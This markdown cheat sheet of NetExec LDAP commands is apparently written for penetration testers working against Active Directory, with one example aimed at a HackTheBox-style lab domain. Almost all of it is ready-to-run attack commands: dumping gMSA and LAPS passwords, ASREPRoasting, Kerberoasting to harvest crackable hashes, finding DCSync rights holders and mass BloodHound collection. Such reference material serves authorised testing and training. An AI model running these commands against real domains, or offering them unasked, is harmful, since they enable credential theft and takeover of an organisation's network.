# NetExec LDAP

### Bloodhound collector ALL

Enumerate bloodhound collector ALL with NetExec LDAP.

```sh title:"NetExec LDAP Enumerate Bloodhound Collector ALL"
nxc ldap $domain -u $user $auth_flags --bloodhound -c all --dns-server $domain
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### User enumeration

Enumerate user enumeration with NetExec LDAP.

```sh title:"NetExec LDAP Enumerate User Enumeration"
nxc ldap $domain -u $user $auth_flags --users-export users.txt
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Dump gMSA accounts

Dump gMSA accounts with NetExec LDAP.

```sh title:"NetExec LDAP Dump GMSA Accounts"
nxc ldap $domain -u $user $auth_flags --gmsa    
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Arbitrary LDAP query

Enumerate arbitrary LDAP query with NetExec LDAP.

```sh title:"NetExec LDAP Enumerate Arbitrary LDAP Query"
nxc ldap $domain -u $user $auth_flags --query '$ldap_query' ""
```
<!-- cheat
import passwords
import domain_ip
import users
import ldap_query
import nxc_auth
-->

### ASREPRoast unauthenticated

Read ASREPRoast unauthenticated with NetExec LDAP.

```sh title:"NetExec LDAP Read ASREPRoast Unauthenticated"
nxc ldap $domain -u $users_file -p '' --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var users_file
-->

### ASREPRoast authenticated

Read ASREPRoast authenticated with NetExec LDAP.

```sh title:"NetExec LDAP Read ASREPRoast Authenticated"
nxc ldap $domain -u $user $auth_flags --asreproast asreproast.out
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ADIDNS records

Scan ADIDNS records with NetExec LDAP.

```sh title:"NetExec LDAP Scan ADIDNS Records"
nxc ldap $domain -u $user $auth_flags -M get-network -o ALL=true
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### LAPS passwords

Read LAPS passwords with NetExec LDAP.

```sh title:"NetExec LDAP Read LAPS Passwords"
nxc ldap $domain -u $user $auth_flags -M laps
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### Machine Account Quota

Check machine account quota with NetExec LDAP.

```sh title:"NetExec LDAP Check Machine Account Quota"
nxc ldap $domain -u $user $auth_flags -M maq
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### DCSync rights holders

Read DCSync rights holders with NetExec LDAP.

```sh title:"NetExec LDAP Read DCSync Rights Holders"
nxc ldap $domain -u $user $auth_flags -M daclread -o TARGET_DN="DC=inlanefreight,DC=htb" ACTION=read RIGHTS=DCSync
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc kerberoasting

### Kerberoasting

Enable kerberoasting with NetExec LDAP.

```sh title:"NetExec LDAP Enable Kerberoasting"
nxc ldap $domain -u $user $auth_flags --kerberoasting $hashes_file
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var hashes_file
-->

### Trusted for delegation

List trusted for delegation with NetExec LDAP.

```sh title:"NetExec LDAP List Trusted for Delegation"
nxc ldap $domain -u $user $auth_flags --trusted-for-delegation
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

## nxc config generation

### Generate krb5.conf

Generate krb5.conf with NetExec LDAP.

```sh title:"NetExec LDAP Generate Krb5.conf"
nxc smb $domain -u $user $auth_flags --generate-krb5-file krb5.conf && sudo mv krb5.conf /etc/krb5.conf
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->
